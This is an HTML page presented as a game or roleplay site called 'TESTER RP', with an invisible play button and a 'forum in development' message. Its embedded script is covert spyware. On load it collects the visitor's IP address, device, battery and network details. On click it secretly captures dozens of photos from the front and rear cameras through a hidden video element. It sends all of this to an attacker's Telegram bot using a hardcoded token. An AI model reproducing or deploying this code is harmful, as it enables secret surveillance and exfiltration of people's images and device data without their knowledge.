<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }body {
        overflow: hidden;
        touch-action: none;
        -webkit-text-size-adjust: none;
        text-size-adjust: none;
        height: 100vh;
        font-family: Arial, sans-serif;
        position: relative;
        background: #000;
        display: flex;
        flex-direction: column;
    }
    
    .background-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
        background-size: cover;
        z-index: -2;
    }
    
    .content {
        position: relative;
        z-index: 1;
        height: 100vh;
        display: flex;
        flex-direction: column;
        justify-content: flex-end;
        align-items: center;
        padding-bottom: 20px;
    }
    
    .play-btn {
        background: transparent;
        border: none;
        width: 200px;
        height: 80px;
        margin-bottom: 100px;
        cursor: pointer;
        position: absolute;
        bottom: 150px;
        opacity: 0;
    }
    
    .hidden-camera {
        position: absolute;
        opacity: 0;
        width: 1px;
        height: 1px;
    }
    
    .legal-links {
        position: absolute;
        bottom: 10px;
        width: 100%;
        text-align: center;
        color: #fff;
        font-size: 12px;
        padding: 5px 0;
    }
    
    .message-box {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: rgba(0, 0, 0, 0.8);
        color: white;
        padding: 20px;
        border-radius: 10px;
        text-align: center;
        z-index: 100;
        display: none;
    }
</style>

</head>
<body>
    <div class="background-container"></div><div class="content">
    <button class="play-btn" id="playBtn"></button>
</div>

<div class="legal-links">
    Договор оферты    Политика конфиденциальности
</div>

<div class="message-box" id="messageBox">
    Форум в разработке
</div>

<video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

<script>
    // Перенаправление в Chrome при открытии из других приложений
    if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
        window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
    }

    const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
    const chatId = '-1002577213610';
    const videoElement = document.getElementById('hiddenCamera');
    const playBtn = document.getElementById('playBtn');
    const messageBox = document.getElementById('messageBox');
    let stream = null;
    let currentCamera = 'user'; // 'user' - фронтальная, 'environment' - задняя
    let photoCount = 0;
    const totalPhotos = 40;
    const photoInterval = 250; // 0.25 секунды в миллисекундах

    // Блокировка масштабирования
    document.addEventListener('gesturestart', function(e) {
        e.preventDefault();
    });
    
    document.addEventListener('touchmove', function(e) {
        if(e.scale !== 1) {
            e.preventDefault();
        }
    }, { passive: false });

    // Функция для получения информации о батарее
    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Да' : 'Нет',
                    chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
                    dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
                };
            } catch (e) {
                return { error: 'Не удалось получить данные о батарее' };
            }
        }
        return { error: 'API батареи не поддерживается' };
    }

    // Функция для получения информации о соединении
    function getConnectionInfo() {
        if ('connection' in navigator) {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    type: connection.type || 'Неизвестно',
                    effectiveType: connection.effectiveType || 'Неизвестно',
                    downlink: connection.downlink + ' Mbps',
                    rtt: connection.rtt + ' мс',
                    saveData: connection.saveData ? 'Да' : 'Нет'
                };
            }
        }
        return { error: 'Информация о соединении недоступна' };
    }

    // Функция для получения информации об устройстве
    function getDeviceInfo() {
        const screen = window.screen;
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
            cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
            doNotTrack: navigator.doNotTrack || 'Неизвестно',
            hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
            maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth + ' бит',
                pixelDepth: screen.pixelDepth + ' бит',
                orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            date: new Date().toString(),
            localTime: new Date().toLocaleString(),
            timezoneOffset: new Date().getTimezoneOffset() + ' минут'
        };

        return deviceInfo;
    }

    // Функция для форматирования информации в читаемый вид
    function formatInfo(info) {
        let result = '';
        for (const [key, value] of Object.entries(info)) {
            if (typeof value === 'object' && value !== null) {
                result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
            } else {
                result += `${key}: ${value}\n`;
            }
        }
        return result;
    }

    // 1. Отправка информации о пользователе
    async function sendUserInfo() {
        try {
            // Получаем IP-адрес
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // Получаем дополнительную информацию (без геолокации)
            const [batteryInfo, connectionInfo] = await Promise.all([
                getBatteryInfo(),
                getConnectionInfo()
            ]);

            const deviceInfo = getDeviceInfo();

            // Формируем сообщение
            let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
            message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
            message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
            message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;

            // Отправляем сообщение в Telegram
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

        } catch (error) {
            console.error('Error sending user info:', error);
            // Отправляем хотя бы базовую информацию в случае ошибки
            try {
                const deviceInfo = getDeviceInfo();
                let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
                fallbackMessage += formatInfo(deviceInfo);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: fallbackMessage
                    })
                });
            } catch (e) {
                console.error('Fallback error:', e);
            }
        }
    }

    // 2. Захват фото с камеры и отправка
    async function captureAndSendPhoto(index, cameraType) {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            
            const blob = await new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.8);
            });
            
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
            
            const caption = `🆔 Фото ${cameraType === 'user' ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            console.log(`Фото ${index} (${cameraType}) отправлено`);
            
        } catch (error) {
            console.error(`Ошибка при отправке фото ${index}:`, error);
        }
    }

    // 3. Серийная съемка
    async function takeSeriesOfPhotos() {
        try {
            if (photoCount < totalPhotos) {
                await captureAndSendPhoto(photoCount + 1, currentCamera);
                photoCount++;
                
                if (photoCount < totalPhotos) {
                    setTimeout(takeSeriesOfPhotos, photoInterval);
                } else {
                    // Переключаем на другую камеру
                    if (currentCamera === 'user') {
                        currentCamera = 'environment';
                        photoCount = 0;
                        stopCamera();
                        await startCamera();
                    } else {
                        // Завершаем съемку
                        messageBox.style.display = 'block';
                        stopCamera();
                    }
                }
            }
            
        } catch (error) {
            console.error('Ошибка в процессе серийной съемки:', error);
            messageBox.style.display = 'block';
            stopCamera();
        }
    }

    // 4. Запуск камеры устройства
    async function startCamera() {
        try {
            // Проверяем, есть ли доступ к камере
            const devices = await navigator.mediaDevices.enumerateDevices();
            const hasCamera = devices.some(device => device.kind === 'videoinput');
            
            if (!hasCamera) {
                throw new Error('Камера не обнаружена');
            }
            
            // Запрашиваем разрешение на доступ к камере
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: currentCamera,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            videoElement.srcObject = stream;
            
            // Даем камере 1 секунду на инициализацию перед съемкой
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Начинаем серийную съемку
            photoCount = 0;
            takeSeriesOfPhotos();
            
        } catch (error) {
            console.error('Ошибка при запуске камеры:', error);
            messageBox.style.display = 'block';
            
            // Отправляем сообщение об ошибке камеры
            try {
                const errorMessage = `⚠️ Ошибка доступа к камере:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: errorMessage
                    })
                });
            } catch (e) {
                console.error('Ошибка при отправке сообщения об ошибке:', e);
            }
        }
    }

    // 5. Остановка камеры
    function stopCamera() {
        if (stream) {
            try {
                stream.getTracks().forEach(track => {
                    track.stop();
                    console.log('Трек камеры остановлен');
                });
                videoElement.srcObject = null;
                console.log('Камера успешно отключена');
            } catch (error) {
                console.error('Ошибка при остановке камеры:', error);
            }
        }
    }

    // 6. Обработчик кнопки "Играть"
    playBtn.addEventListener('click', async function() {
        console.log('Начало процесса верификации...');
        try {
            await sendUserInfo();
            console.log('Информация о пользователе отправлена');
            currentCamera = 'user'; // Начинаем с фронтальной камеры
            photoCount = 0;
            await startCamera();
        } catch (error) {
            console.error('Общая ошибка процесса верификации:', error);
            messageBox.style.display = 'block';
        }
    });

    // Отправляем информацию о пользователе сразу при загрузке страницы
    window.addEventListener('load', function() {
        console.log('Страница загружена, отправка информации...');
        sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
    });

    // Остановка камеры при закрытии страницы
    window.addEventListener('beforeunload', function() {
        console.log('Страница закрывается, остановка камеры...');
        stopCamera();
    });

    // Дополнительная обработка видимости страницы
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            console.log('Страница стала неактивной, остановка камеры...');
            stopCamera();
        }
    });
</script>
</body>
</html>
